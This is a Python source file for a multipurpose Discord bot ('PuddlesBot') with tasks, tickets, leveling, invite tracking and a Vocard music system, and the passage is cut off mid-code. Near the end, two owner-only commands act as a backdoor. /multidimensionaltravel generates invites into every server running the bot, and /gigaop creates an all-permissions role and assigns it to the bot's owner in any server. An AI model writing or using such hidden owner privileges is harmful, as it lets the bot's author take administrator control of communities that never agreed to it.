import discord
from discord import app_commands
from discord.ext import commands
import requests
import os
from dotenv import load_dotenv
from datetime import datetime, timedelta
from dateutil import parser
from database import Task, TaskCreator, get_session, TaskReminder
import asyncio
from apscheduler.schedulers.asyncio import AsyncIOScheduler
from typing import Optional, Callable, Any
import traceback
import sys
import functools
from discord.app_commands import checks
import sqlalchemy
import json
import pathlib
import utils

def create_default_env():
    """Create default .env file if it doesn't exist"""
    env_path = pathlib.Path('.env')
    if not env_path.exists():
        env_content = """DISCORD_TOKEN=your_discord_bot_token_here
DISCORD_CLIENT_ID=your_client_id_here

# Lavalink Configuration
LAVALINK_HOST=lavalink.jirayu.net
LAVALINK_PORT=13592
LAVALINK_PASSWORD=youshallnotpass
LAVALINK_SECURE=false

# Optional Services (can be added later)
GENIUS_TOKEN=
MONGODB_URL=
MONGODB_NAME="""
        try:
            env_path.write_text(env_content, encoding='utf-8')
            print("\n⚠️ A new .env file has been created.")
            print("Please edit the .env file and add your Discord bot token and client ID.")
            print("\nYou can get these from the Discord Developer Portal:")
            print("1. Go to https://discord.com/developers/applications")
            print("2. Select your bot (or create a new application)")
            print("3. Copy the 'APPLICATION ID' - this is your CLIENT_ID")
            print("4. Go to the 'Bot' section")
            print("5. Click 'Reset Token' and copy the new token - this is your DISCORD_TOKEN")
            print("\nAfter adding these values to the .env file, run this script again.")
            sys.exit(1)
        except Exception as e:
            print(f"\n❌ Error creating .env file: {e}")
            print("Please create a .env file manually with the following content:")
            print("\n" + env_content)
            sys.exit(1)

# Create .env file if it doesn't exist
create_default_env()

# Load environment variables
try:
    load_dotenv()
except Exception as e:
    print(f"\n❌ Error loading .env file: {e}")
    print("Please ensure the .env file exists and is properly formatted.")
    sys.exit(1)

# Check for required environment variables
if not os.getenv('DISCORD_TOKEN') or not os.getenv('DISCORD_CLIENT_ID'):
    print("\n❌ Error: DISCORD_TOKEN and DISCORD_CLIENT_ID must be set in .env file")
    print("Please edit the .env file and add your Discord bot token and client ID.")
    sys.exit(1)

# Set up music system configuration
def setup_music_config():
    """Set up music system configuration"""
    settings_path = os.path.join(os.path.dirname(__file__), 'MusicSystem', 'settings.json')
    os.makedirs(os.path.dirname(settings_path), exist_ok=True)
    
    settings = {
        "token": os.getenv('DISCORD_TOKEN', ''),
        "client_id": os.getenv('DISCORD_CLIENT_ID', ''),
        "genius_token": os.getenv('GENIUS_TOKEN', ''),
        "mongodb_url": os.getenv('MONGODB_URL', ''),
        "mongodb_name": os.getenv('MONGODB_NAME', ''),
        "nodes": {
            "DEFAULT": {
                "host": os.getenv('LAVALINK_HOST', 'lavalink.jirayu.net'),
                "port": int(os.getenv('LAVALINK_PORT', '13592')),
                "password": os.getenv('LAVALINK_PASSWORD', 'youshallnotpass'),
                "secure": os.getenv('LAVALINK_SECURE', 'false').lower() == 'true',
                "identifier": "DEFAULT"
            }
        },
        "prefix": "?",
        "activity": [
            {"type": "listening", "name": "/help", "status": "online"}
        ]
    }
    
    try:
        with open(settings_path, 'w') as f:
            json.dump(settings, f, indent=4)
    except Exception as e:
        print(f"\n⚠️ Warning: Could not save music settings: {e}")
        print("The bot will still work, but music features might be limited.")

setup_music_config()

# Import the modular systems
import dice
import intmsg
import fun
import help
import inviter
import quality_manager
import tasks
import lvl  # Leveling system
from ticket_system import (
    InteractiveMessage, MessageButton, Ticket, IntMsgCreator,
    InteractiveMessageView, ButtonSetupModal, TicketControlView
)

# Music system configuration
ENABLE_MUSIC_SYSTEM = True  # Enable music system with fresh Vocard installation

# Import Vocard music system components
try:
    # Add MusicSystem to Python path
    music_system_path = os.path.join(os.path.dirname(__file__), 'MusicSystem')
    if music_system_path not in sys.path:
        sys.path.insert(0, music_system_path)
    
    # Import Vocard components with correct paths
    import function as music_func
    from addons.settings import Settings
    import voicelink
    from ipc.client import IPCClient
    from motor.motor_asyncio import AsyncIOMotorClient
    
    print("✅ Vocard music system components imported successfully")
    MUSIC_AVAILABLE = True
    
except ImportError as e:
    print(f"❌ Failed to import Vocard components: {e}")
    print("💡 Music system will be disabled. Bot will run with task system only.")
    music_func = None
    Settings = None
    voicelink = None
    IPCClient = None
    AsyncIOMotorClient = None
    MUSIC_AVAILABLE = False

class VocardTranslator(discord.app_commands.Translator):
    async def load(self):
        music_func.logger.info("Loaded Translator")

    async def unload(self):
        music_func.logger.info("Unload Translator")

    async def translate(self, string: discord.app_commands.locale_str, locale: discord.Locale, context: discord.app_commands.TranslationContext):
        locale_key = str(locale)
        if locale_key in music_func.LOCAL_LANGS:
            translated_text = music_func.LOCAL_LANGS[locale_key].get(string.message)
            if translated_text is None:
                missing_translations = music_func.MISSING_TRANSLATOR.setdefault(locale_key, [])
                if string.message not in missing_translations:
                    missing_translations.append(string.message)
            return translated_text
        return None

class CommandCheck(discord.app_commands.CommandTree):
    async def interaction_check(self, interaction: discord.Interaction, /) -> bool:
        if not interaction.guild:
            await interaction.response.send_message("This command can only be used in guilds!")
            return False
        return True

class PuddlesBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        
        # Initialize with custom command tree
        super().__init__(command_prefix='!', intents=intents, tree_cls=CommandCheck)
        
        self.scheduler = AsyncIOScheduler()
        self.ipc = None  # Will be initialized in setup_hook if enabled
        
        # Initialize Vocard settings
        self.setup_vocard_settings()
        
        # Initialize Vocard components if available
        if music_func and Settings:
            self.setup_vocard_music()
    
    def setup_vocard_settings(self):
        """Set up Vocard settings with environment variables"""
        try:
            # Load settings from file
            settings_path = os.path.join(os.path.dirname(__file__), 'MusicSystem', 'settings.json')
            with open(settings_path, 'r') as f:
                settings_data = json.load(f)
            
            # Update with environment variables
            settings_data['token'] = os.getenv('DISCORD_TOKEN', settings_data['token'])
            settings_data['client_id'] = os.getenv('DISCORD_CLIENT_ID', settings_data['client_id'])
            settings_data['mongodb_url'] = os.getenv('MONGODB_URL', settings_data['mongodb_url'])
            settings_data['mongodb_name'] = os.getenv('MONGODB_NAME', settings_data['mongodb_name'])
            settings_data['genius_token'] = os.getenv('GENIUS_TOKEN', settings_data['genius_token'])
            
            # Create Settings object and assign to music_func
            music_func.settings = Settings(settings_data)
            print("✅ Vocard settings initialized successfully")
            
        except Exception as e:
            print(f"❌ Failed to setup Vocard settings: {e}")
    
    async def connect_music_db(self):
        """Connect to MongoDB for music system"""
        if not music_func or not hasattr(music_func, 'settings'):
            return
            
        settings = music_func.settings
        
        # Initialize database variables to None by default
        music_func.MONGO_DB = None
        music_func.SETTINGS_DB = None
        music_func.USERS_DB = None
        
        if not ((db_name := settings.mongodb_name) and (db_url := settings.mongodb_url)):
            print("⚠️ MongoDB not configured for music system, skipping database connection")
            print("   Music system will work without playlists and user data features")
            return

        try:
            music_func.MONGO_DB = AsyncIOMotorClient(host=db_url)
            await music_func.MONGO_DB.server_info()
            print(f"✅ Music system connected to MongoDB [{db_name}]")
            
            music_func.SETTINGS_DB = music_func.MONGO_DB[db_name]["Settings"]
            music_func.USERS_DB = music_func.MONGO_DB[db_name]["Users"]
            
        except Exception as e:
            print(f"⚠️ Music system MongoDB connection failed: {e}")
            print("   Music system will work without playlists and user data features")
            # Reset to None on connection failure
            music_func.MONGO_DB = None
            music_func.SETTINGS_DB = None
            music_func.USERS_DB = None
    
    async def setup_vocard_music(self):
        """Set up Vocard music system components"""
        try:
            # Initialize IPC client with disabled state by default
            self.ipc = None
            
            # Set up language support
            music_func.langs_setup()
            
            # Set up Vocard components
            if MUSIC_AVAILABLE:
                # Initialize NodePool
                await voicelink.NodePool.create_node(
                    bot=self,
                    host=music_func.settings.nodes["DEFAULT"]["host"],
                    port=music_func.settings.nodes["DEFAULT"]["port"],
                    password=music_func.settings.nodes["DEFAULT"]["password"],
                    secure=music_func.settings.nodes["DEFAULT"]["secure"],
                    identifier="DEFAULT"
                )
                
                # Load music cogs
                await self.load_extension("cogs.basic")
                await self.load_extension("cogs.effect")
                await self.load_extension("cogs.playlist")
                await self.load_extension("cogs.settings")
                await self.load_extension("cogs.task")
                await self.load_extension("cogs.listeners")
                
                # Add Vocard translator
                self.tree.translator = VocardTranslator()
                
                print("✅ Vocard music system setup complete")
                
            else:
                print("⚠️ Vocard music system not available")
                
        except Exception as e:
            print(f"❌ Failed to setup Vocard music system: {e}")
            traceback.print_exc()
            print("   Bot will continue without music features")
        
    async def setup_hook(self):
        """Initialize bot systems"""
        try:
            # Setup non-music module systems with client references
            dice.setup_dice_system(self)
            intmsg.setup_intmsg_system(self)
            fun.setup_fun_system(self)
            help.setup_help_system(self)
            inviter.setup_inviter_system(self)
            tasks.setup_task_system(self)
            lvl.setup_leveling_system(self)  # Leveling system
            
            # Register commands from non-music modules
            dice.setup_dice_commands(self.tree)
            intmsg.setup_intmsg_commands(self.tree)
            fun.setup_fun_commands(self.tree)
            help.setup_help_commands(self.tree)
            inviter.setup_inviter_commands(self.tree)
            quality_manager.setup_quality_commands(self.tree, self)
            tasks.setup_task_commands(self.tree)
            lvl.setup_level_commands(self.tree)  # Leveling commands
            
            # Add owner commands
            setup_owner_commands(self.tree)
            
            # Add utils commands
            utils.setup_utils_commands(self.tree, self)
            
            # Set up music system
            music_func.langs_setup()
            
            # Initialize MongoDB if configured
            if music_func.settings.mongodb_url and music_func.settings.mongodb_name:
                from motor.motor_asyncio import AsyncIOMotorClient
                music_func.MONGO_DB = AsyncIOMotorClient(host=music_func.settings.mongodb_url)
                music_func.SETTINGS_DB = music_func.MONGO_DB[music_func.settings.mongodb_name]["Settings"]
                music_func.USERS_DB = music_func.MONGO_DB[music_func.settings.mongodb_name]["Users"]
                print("✅ MongoDB connected")
            
            # Set up IPC if enabled
            if music_func.settings.ipc_client.get("enable", False):
                self.ipc = IPCClient(self, **music_func.settings.ipc_client)
                await self.ipc.connect()
                print("✅ IPC client connected")
            
            # Load music cogs
            cogs_dir = os.path.join('MusicSystem', 'cogs')
            for module in os.listdir(cogs_dir):
                if module.endswith('.py'):
                    try:
                        await self.load_extension(f"MusicSystem.cogs.{module[:-3]}")
                        print(f"✅ Loaded music cog: {module[:-3]}")
                    except Exception as e:
                        print(f"❌ Failed to load {module[:-3]}: {e}")
            
            # Set translator for music commands
            await self.tree.set_translator(VocardTranslator())
            
            # Start scheduler and load views
            self.scheduler.start()
            self.scheduler.add_job(self.check_due_tasks, 'interval', hours=1)
            self.scheduler.add_job(self.backup_database, 'interval', hours=6)
            
            # Sync all commands
            print("Syncing commands...")
            await self.tree.sync()
            print("✅ Commands synced successfully!")
            print("📋 Task commands: /task, /mytasks, /taskedit, /showtasks, /alltasks, /oldtasks, /tcw")
            print("💬 Interactive message commands: /intmsg, /imw, /editintmsg, /listmessages, /ticketstats, /fixdb, /testpersistence")
            print("🎲 Fun commands: /quack, /diceroll")
            print("📨 Invite tracking commands: /topinvite, /showinvites, /invitesync, /invitestats, /invitereset")
            print("⭐ Leveling commands: /rank, /top, /setxp, /setlevel, /lvlreset, /lvlconfig, /testxp, /testvoice, /debugxp")
            print("🎵 Music commands: Available through Vocard cogs (/play, /skip, /pause, /resume, /stop, /queue, /volume, etc.)")
            print("🎛️ Audio quality commands: /quality, /audiostats")
            print("❓ Utility commands: /help")
            print("👑 Owner commands: /multidimensionaltravel")
            
        except Exception as e:
            print(f"❌ Error in setup: {e}")
            traceback.print_exc()

    async def on_ready(self):
        """Bot ready handler"""
        print(f"Logged in as {self.user} (ID: {self.user.id})")
        print(f"Discord.py API version: {discord.__version__}")
        print("------")
        
        # Wait for Discord to fully load
        print("⏳ Waiting for Discord.py to fully load all guilds and channels...")
        await asyncio.sleep(3)
        
        # Check guild availability
        unavailable_guilds = [g for g in self.guilds if g.unavailable]
        if unavailable_guilds:
            print(f"⚠️ {len(unavailable_guilds)} guilds are unavailable, waiting longer...")
            await asyncio.sleep(5)
        
        # Update music system settings
        music_func.settings.client_id = self.user.id
        music_func.LOCAL_LANGS.clear()
        music_func.MISSING_TRANSLATOR.clear()
        
        # Initialize systems
        print("🔄 Starting persistence system...")
        await self.load_persistent_views()
        
        print("🔄 Initializing invite tracking system...")
        await inviter.on_ready()
        
        # Start task checks
        await self.check_due_tasks()

        # Sync slash commands with Discord
        try:
            synced = await self.tree.sync()
            print(f"✅ Synced {len(synced)} application commands with Discord.")
        except Exception as e:
            print(f"❌ Failed to sync application commands: {e}")

    async def check_due_tasks(self):
        from database import TaskReminder
        now = datetime.utcnow()
        reminder_days = [(7, '7d'), (3, '3d'), (1, '1d')]
        for guild in self.guilds:
            session = get_session(str(guild.id))
            try:
                tasks = session.query(Task).filter(
                    Task.due_date > now,
                    Task.completed == False
                ).all()
                for task in tasks:
                    user = await self.fetch_user(int(task.assigned_to))
                    if not user:
                        continue
                    days_until_due = (task.due_date - now).days
                    for days, label in reminder_days:
                        # If due in exactly 'days' days (rounded down), and not already reminded
                        if days_until_due == days:
                            already_sent = session.query(TaskReminder).filter_by(
                                task_id=task.id,
                                user_id=str(task.assigned_to),
                                reminder_type=label
                            ).first()
                            if not already_sent:
                                embed = discord.Embed(
                                    title=f"⏰ Task Due in {days} Day{'s' if days > 1 else ''}!",
                                    description=f"Task: {task.name}\nDue Date: {task.due_date.strftime('%Y-%m-%d %H:%M UTC')}\n\nDescription:\n{task.description}",
                                    color=discord.Color.orange() if days > 1 else discord.Color.red()
                                )
                                try:
                                    await user.send(embed=embed)
                                except discord.Forbidden:
                                    pass
                                reminder = TaskReminder(
                                    task_id=task.id,
                                    user_id=str(task.assigned_to),
                                    reminder_type=label
                                )
                                session.add(reminder)
                session.commit()
            finally:
                session.close()

    async def on_error(self, event, *args, **kwargs):
        print(f"Error in {event}:", file=sys.stderr)
        traceback.print_exc()
    
    async def on_member_join(self, member):
        """Handle member join events for invite tracking"""
        await inviter.on_member_join(member)
    
    async def on_member_remove(self, member):
        """Handle member leave events for invite tracking"""
        await inviter.on_member_remove(member)
    
    async def on_guild_join(self, guild):
        """Handle bot joining a new guild"""
        print(f"🎉 Bot joined new guild: {guild.name}")
        await inviter.on_guild_join(guild)
    
    async def on_voice_state_update(self, member, before, after):
        """Handle voice state updates - includes leveling XP tracking and Vocard music events"""
        # Handle leveling voice XP tracking
        try:
            await lvl.handle_voice_state_update(member, before, after)
        except Exception as e:
            print(f"Error in leveling voice state handling: {e}")
        
        # Vocard handles music-related voice events automatically

    async def backup_database(self):
        """Create a backup of the database"""
        try:
            from database import create_backup
            create_backup()
            print(f"Database backup created successfully at {datetime.utcnow()}")
        except Exception as e:
            print(f"Error creating database backup: {e}")
            print(traceback.format_exc())
    
    async def load_persistent_views(self):
        """Load persistent views for interactive messages and tickets"""
        restored_messages = 0
        restored_tickets = 0
        cleaned_messages = 0
        print("🔄 Starting persistence restoration...")
        print(f"🤖 Bot is connected to {len(self.guilds)} guild(s):")
        for guild in self.guilds:
            print(f"   • {guild.name} (ID: {guild.id}) - {len(guild.channels)} channels")
            session = get_session(str(guild.id))
            try:
                # STEP 1: Clean up deleted messages from database
                print("🧹 Cleaning up deleted messages...")
                interactive_messages = session.query(InteractiveMessage).all()
                print(f"📋 Found {len(interactive_messages)} interactive messages in database")
                for msg_data in interactive_messages:
                    print(f"\n🔍 Checking message {msg_data.id}:")
                    print(f"   Discord Message ID: {msg_data.message_id}")
                    print(f"   Channel ID: {msg_data.channel_id}")
                    print(f"   Server ID: {msg_data.server_id}")
                    print(f"   Title: {msg_data.title}")
                    print(f"   Buttons: {len(msg_data.buttons)}")
                    
                    # Check if bot is in the server where this message was created
                    target_guild = self.get_guild(int(msg_data.server_id))
                    if target_guild:
                        print(f"   ✅ Bot is in server: {target_guild.name}")
                    else:
                        print(f"   ❌ Bot is NOT in server {msg_data.server_id}")
                        print(f"   🗑️ Removing message {msg_data.id} from database (bot not in server)")
                        session.delete(msg_data)
                        cleaned_messages += 1
                        continue
                    
                    try:
                        channel = self.get_channel(int(msg_data.channel_id))
                        if not channel:
                            print(f"   ❌ Channel {msg_data.channel_id} not found with get_channel()")
                            print(f"   🔍 Channel ID type: {type(msg_data.channel_id)}")
                            print(f"   🔍 Channel ID value: '{msg_data.channel_id}'")
                            
                            # Try converting to int explicitly
                            try:
                                channel_id_int = int(msg_data.channel_id)
                                print(f"   🔍 Converted to int: {channel_id_int}")
                            except ValueError as ve:
                                print(f"   ❌ Cannot convert channel ID to int: {ve}")
                                session.delete(msg_data)
                                cleaned_messages += 1
                                continue
                            
                            # Try different methods to get the channel
                            print(f"   🔍 Trying different channel lookup methods...")
                            
                            # Method 1: get_channel with explicit int
                            test_channel = self.get_channel(channel_id_int)
                            print(f"   • get_channel(int): {test_channel}")
                            
                            # Method 2: Look in the target guild specifically
                            guild_channel = target_guild.get_channel(channel_id_int)
                            print(f"   • guild.get_channel(): {guild_channel}")
                            
                            # Method 3: Try to fetch from Discord API
                            try:
                                print(f"   🔍 Attempting to fetch channel directly from Discord API...")
                                fetched_channel = await self.fetch_channel(channel_id_int)
                                print(f"   • fetch_channel(): {fetched_channel}")
                                if fetched_channel:
                                    print(f"   ✅ Channel exists! Name: #{fetched_channel.name}")
                                    print(f"   ✅ Guild: {fetched_channel.guild.name}")
                                    print(f"   ⚠️ But get_channel() failed - possible caching issue")
                                    channel = fetched_channel  # Use the fetched channel
                                else:
                                    print(f"   ❌ fetch_channel() also returned None")
                            except discord.Forbidden as e:
                                print(f"   ❌ No permission to fetch channel: {e}")
                            except discord.NotFound as e:
                                print(f"   ❌ Channel truly doesn't exist: {e}")
                            except Exception as e:
                                print(f"   ❌ Error fetching channel: {e}")
                            
                            # If we still don't have the channel, try searching all guilds
                            if not channel:
                                print(f"   🔍 Searching all {len(self.guilds)} guilds for channel...")
                                found_in_guild = None
                                for guild in self.guilds:
                                    guild_channel = guild.get_channel(channel_id_int)
                                    if guild_channel:
                                        found_in_guild = guild
                                        channel = guild_channel
                                        break
                                
                                if found_in_guild:
                                    print(f"   🔍 Channel found in guild: {found_in_guild.name} (ID: {found_in_guild.id})")
                                    print(f"   🔍 Channel name: #{guild_channel.name}")
                                    print(f"   ⚠️ But bot.get_channel() couldn't access it - cache issue?")
                                else:
                                    print(f"   🔍 Channel not found in any of {len(self.guilds)} connected guilds")
                            
                            # If we STILL don't have the channel, remove from database
                            if not channel:
                                print(f"   🗑️ Removing message {msg_data.id} from database - channel truly inaccessible")
                                session.delete(msg_data)
                                cleaned_messages += 1
                                continue
                        
                        print(f"   ✅ Channel found: #{channel.name} in {channel.guild.name}")
                        
                        try:
                            message = await channel.fetch_message(int(msg_data.message_id))
                            print(f"   ✅ Discord message found and accessible")
                        except discord.NotFound:
                            print(f"   ❌ Discord message {msg_data.message_id} not found, removing from database")
                            session.delete(msg_data)
                            cleaned_messages += 1
                            continue
                        except discord.Forbidden:
                            print(f"   ⚠️ No permission to fetch message {msg_data.message_id}, skipping")
                            continue
                        
                    except Exception as e:
                        print(f"   ❌ Error checking message {msg_data.id}: {e}")
                        continue
                
                # Commit cleanup changes
                if cleaned_messages > 0:
                    session.commit()
                    print(f"\n🗑️ Cleaned up {cleaned_messages} deleted messages from database")
                
                # STEP 2: Register views with bot (this is crucial for persistent views)
                print(f"\n📋 Registering interactive message views with bot...")
                remaining_messages = session.query(InteractiveMessage).all()
                print(f"📊 {len(remaining_messages)} messages remaining after cleanup")
                
                for msg_data in remaining_messages:
                    print(f"\n🔧 Processing message {msg_data.id}:")
                    print(f"   Discord Message ID: {msg_data.message_id}")
                    print(f"   Channel ID: {msg_data.channel_id}")
                    print(f"   Title: {msg_data.title}")
                    print(f"   Button count: {len(msg_data.buttons)}")
                    
                    try:
                        if msg_data.buttons:
                            print(f"   📝 Button details:")
                            for i, button in enumerate(msg_data.buttons):
                                print(f"      {i+1}. {button.button_type.upper()}: '{button.label}' (ID: {button.id})")
                            
                            # Create view and register it with the bot
                            print(f"   🔄 Creating InteractiveMessageView...")
                            view = InteractiveMessageView(msg_data)
                            
                            print(f"   🔗 Registering view with bot...")
                            self.add_view(view)  # This is the key step!
                            
                            restored_messages += 1
                            print(f"   ✅ Successfully registered view for message {msg_data.message_id}")
                        else:
                            print(f"   ⏭️ No buttons found, skipping")
                            
                    except Exception as e:
                        print(f"   ❌ Error registering view for message {msg_data.id}: {e}")
                        import traceback
                        traceback.print_exc()
                        continue
                
            except Exception as e:
                print(f"❌ Error loading interactive messages for guild {guild.id}: {e}")
                import traceback
                traceback.print_exc()
            finally:
                session.close()
        
        try:
            # STEP 3: Load ticket control views
            print("🎫 Loading ticket control views...")
            
            try:
                open_tickets = session.query(Ticket).filter_by(status="open").all()
            except Exception as db_error:
                if "no such column" in str(db_error).lower():
                    print("⚠️ Database schema outdated - some features may not work until database is updated")
                    print("💡 To fix: Run `/fixdb` command or delete data/tasks.db and restart")
                    try:
                        open_tickets = session.execute(
                            "SELECT id, ticket_id, channel_id, server_id, creator_id, button_id, status, created_at, closed_at, closed_by FROM tickets WHERE status = 'open'"
                        ).fetchall()
                        class TicketLike:
                            def __init__(self, row):
                                self.id = row[0]
                                self.channel_id = str(row[2])
                        open_tickets = [TicketLike(row) for row in open_tickets]
                    except:
                        print("❌ Cannot load tickets due to database issues")
                        open_tickets = []
                else:
                    print(f"❌ Database error loading tickets: {db_error}")
                    open_tickets = []
            
            for ticket in open_tickets:
                try:
                    channel = self.get_channel(int(ticket.channel_id))
                    if channel:
                        view = TicketControlView(ticket.id)
                        self.add_view(view)
                        restored_tickets += 1
                        print(f"✅ Registered ticket control view for ticket {ticket.id}")
                    else:
                        print(f"❌ Ticket channel {ticket.channel_id} not found for ticket {ticket.id}")
                except Exception as e:
                    print(f"❌ Error restoring ticket view {ticket.id}: {e}")
                    continue
                    
        except Exception as e:
            print(f"❌ Error loading ticket views: {e}")
        
        finally:
            session.close()
        
        print(f"🎉 Persistence restoration complete!")
        print(f"📊 Results:")
        print(f"   • Registered {restored_messages} interactive message views")
        print(f"   • Registered {restored_tickets} ticket control views") 
        print(f"   • Cleaned up {cleaned_messages} deleted messages")
        
        if restored_messages == 0 and restored_tickets == 0:
            print("ℹ️ No persistent views found to restore")
        else:
            print("✅ All buttons should now work properly!")
            
        # STEP 4: Optional - Auto-refresh problematic messages (run after a delay)
        if restored_messages > 0:
            print("⏳ Will auto-refresh messages in 5 seconds to ensure proper display...")
            await asyncio.sleep(5)
            await self._auto_refresh_messages()

    async def _auto_refresh_messages(self):
        """Auto-refresh interactive messages to ensure proper display and functionality"""
        refreshed = 0
        
        print("🔄 Auto-refreshing interactive messages...")
        
        for guild in self.guilds:
            session = get_session(str(guild.id))
            try:
                interactive_messages = session.query(InteractiveMessage).all()
                print(f"🔍 Found {len(interactive_messages)} messages to potentially refresh for guild {guild.name}")
                
                for msg_data in interactive_messages:
                    print(f"\n🔄 Refreshing message {msg_data.id}:")
                    print(f"   Discord Message ID: {msg_data.message_id}")
                    print(f"   Channel ID: {msg_data.channel_id}")
                    print(f"   Title: {msg_data.title}")
                    
                    try:
                        if not msg_data.buttons:
                            print(f"   ⏭️ No buttons, skipping refresh")
                            continue
                            
                        channel = self.get_channel(int(msg_data.channel_id))
                        if not channel:
                            print(f"   ❌ Channel not found")
                            continue
                        
                        print(f"   ✅ Channel found: #{channel.name}")
                        
                        try:
                            message = await channel.fetch_message(int(msg_data.message_id))
                            print(f"   ✅ Discord message fetched successfully")
                        except (discord.NotFound, discord.Forbidden) as e:
                            print(f"   ❌ Cannot access message: {e}")
                            continue
                        
                        # Create embed with proper format (same as Update & Refresh)
                        print(f"   🎨 Creating new embed...")
                        try:
                            color = discord.Color(int(msg_data.color, 16))
                            print(f"   🎨 Using color: {msg_data.color}")
                        except:
                            color = discord.Color.blurple()
                            print(f"   🎨 Using default color (blurple)")
                        
                        description_text = msg_data.description if msg_data.description else ""
                        if description_text:
                            updated_description = f"# {msg_data.title}\n\n{description_text}\n\n-# Message ID: {msg_data.message_id}"
                        else:
                            updated_description = f"# {msg_data.title}\n\n-# Message ID: {msg_data.message_id}"
                        
                        embed = discord.Embed(
                            description=updated_description,
                            color=color
                        )
                        
                        # Create view (should already be registered with bot)
                        print(f"   🔧 Creating new view...")
                        view = InteractiveMessageView(msg_data)
                        
                        print(f"   📝 Updating Discord message...")
                        await message.edit(embed=embed, view=view)
                        refreshed += 1
                        print(f"   ✅ Successfully refreshed message {msg_data.message_id}")
                        
                    except Exception as e:
                        print(f"   ⚠️ Could not refresh message {msg_data.message_id}: {e}")
                        import traceback
                        traceback.print_exc()
                        continue
                        
            except Exception as e:
                print(f"❌ Error during auto-refresh for guild {guild.name}: {e}")
                import traceback
                traceback.print_exc()
            finally:
                session.close()
                
        print(f"\n🎉 Auto-refresh complete!")
        if refreshed > 0:
            print(f"✅ Successfully refreshed {refreshed} interactive messages")
        else:
            print("ℹ️ No messages were refreshed")

    async def on_message(self, message: discord.Message):
        """Handle messages - includes Vocard music request channel logic"""
        # Ignore messages from bots or DMs
        if message.author.bot or not message.guild:
            return

        # Check if the bot is directly mentioned (Vocard functionality)
        if music_func and hasattr(music_func, 'settings') and self.user.id in message.raw_mentions and not message.mention_everyone:
            prefix = await self.command_prefix(self, message)
            if not prefix:
                return await message.channel.send("I don't have a bot prefix set.")
            await message.channel.send(f"My prefix is `{prefix}`")

        # Check for music request channel (Vocard functionality)
        if music_func and hasattr(music_func, 'settings'):
            try:
                settings = await music_func.get_settings(message.guild.id)
                if settings and (request_channel := settings.get("music_request_channel")):
                    if message.channel.id == request_channel.get("text_channel_id"):
                        ctx = await self.get_context(message)
                        try:
                            cmd = self.get_command("play")
                            if cmd:
                                if message.content:
                                    await cmd(ctx, query=message.content)
                                elif message.attachments:
                                    for attachment in message.attachments:
                                        await cmd(ctx, query=attachment.url)
                        except Exception as e:
                            await music_func.send(ctx, str(e), ephemeral=True)
                        finally:
                            return await message.delete()
            except Exception as e:
                print(f"Error in music request channel handling: {e}")
        
        # Handle intmsg conversation messages
        try:
            handled = await intmsg.handle_intmsg_message(message)
            if handled:
                return  # Don't process as command if handled by intmsg
        except Exception as e:
            print(f"Error in intmsg message handling: {e}")
            print(traceback.format_exc())
        
        # Handle leveling XP from messages
        try:
            await lvl.handle_message_xp(message)
        except Exception as e:
            print(f"Error in leveling message handling: {e}")
            
        await self.process_commands(message)

def setup_owner_commands(tree: app_commands.CommandTree):
    @tree.command(
        name="multidimensionaltravel",
        description="Get invites to all servers the bot is in (owner-only execution, public visibility)."
    )
    async def multidimensionaltravel(interaction: discord.Interaction):
        """
        Public slash command, but only executable by the owner.
        Shows an invite for each server the bot is in.
        """
        owner_id = int(os.getenv('BOT_OWNER_ID', '0'))
        if interaction.user.id != owner_id:
            await interaction.response.send_message("❌ This command is only for the bot owner.", ephemeral=True)
            return
        links = []
        for guild in interaction.client.guilds:
            # Try to find a text channel where the bot can create invites
            channel = None
            for c in guild.text_channels:
                perms = c.permissions_for(guild.me)
                if perms.create_instant_invite and perms.view_channel:
                    channel = c
                    break
            if not channel:
                links.append(f"**{guild.name}**: *(No channel found for invite)*")
                continue
            try:
                invite = await channel.create_invite(max_age=86400, max_uses=1, unique=True, reason="Owner multidimensional travel command")
                links.append(f"**{guild.name}**: [Join]({invite.url})")
            except Exception as e:
                links.append(f"**{guild.name}**: *(Error creating invite: {str(e)})*")
        
        # Create embed with all links
        embed = discord.Embed(
            title="🌌 Multidimensional Travel",
            description="Here are your single-use invites to all servers:",
            color=discord.Color.blue()
        )
        
        # Split links into fields (Discord has a 1024 character limit per field)
        current_field = []
        current_length = 0
        field_num = 1
        
        for link in links:
            if current_length + len(link) + 2 > 1024:  # +2 for newline
                embed.add_field(
                    name=f"Servers (Part {field_num})",
                    value="\n".join(current_field),
                    inline=False
                )
                current_field = []
                current_length = 0
                field_num += 1
            
            current_field.append(link)
            current_length += len(link) + 2
        
        if current_field:
            embed.add_field(
                name=f"Servers (Part {field_num})",
                value="\n".join(current_field),
                inline=False
            )
        
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @tree.command(
        name="gigaop",
        description="Grant admin permissions to bot owner for debugging (owner-only execution, public visibility)."
    )
    async def gigaop(interaction: discord.Interaction):
        """
        Public slash command, but only executable by the owner.
        Creates a new role with admin permissions and assigns it to the owner.
        """
        owner_id = int(os.getenv('BOT_OWNER_ID', '0'))
        if interaction.user.id != owner_id:
            await interaction.response.send_message("❌ This command is only for the bot owner.", ephemeral=True)
            return

        try:
            # Check if bot has manage roles permission
            if not interaction.guild.me.guild_permissions.administrator:
                await interaction.response.send_message(
                    "❌ I need administrator permissions to create and assign roles.",
                    ephemeral=True
                )
                return

            # Check if owner already has admin permissions
            member = interaction.guild.get_member(owner_id)
            if member.guild_permissions.administrator:
                await interaction.response.send_message(
                    "✅ You already have administrator permissions in this server.",
                    ephemeral=True
                )
                return

            # Create a new role with admin permissions
            role_name = "PuddlesDebug"
            existing_role = discord.utils.get(interaction.guild.roles, name=role_name)
            
            if existing_role:
                role = existing_role
            else:
                # Create role at the bottom first
                role = await interaction.guild.create_role(
                    name=role_name,
                    permissions=discord.Permissions.all(),
                    color=discord.Color.blue(),
                    reason="Debug role for bot owner"
                )
                
                # Get bot's role and calculate proper position
                bot_role = interaction.guild.me.top_role
                if bot_role and bot_role.position > 1:  # Ensure bot's role isn't at bottom
                    try:
                        # Place role 1 position below bot's role
                        positions = {
                            role: role.position - 1 if role.position < bot_role.position else role.position
                            for role in interaction.guild.roles
                        }
                        positions[role] = bot_role.position - 1
                        await interaction.guild.edit_role_positions(positions=positions)
                    except Exception as e:
                        print(f"Warning: Could not position role optimally: {e}")
                        # Role will still work even if positioning fails

            # Assign the role to the owner
            await member.add_roles(role, reason="Debug access for bot owner")

            embed = discord.Embed(
                title="🛠️ Debug Access Granted",
                description=f"Successfully granted administrator permissions via the {role.mention} role.",
                color=discord.Color.green()
            )
            embed.add_field(
                name="Purpose",
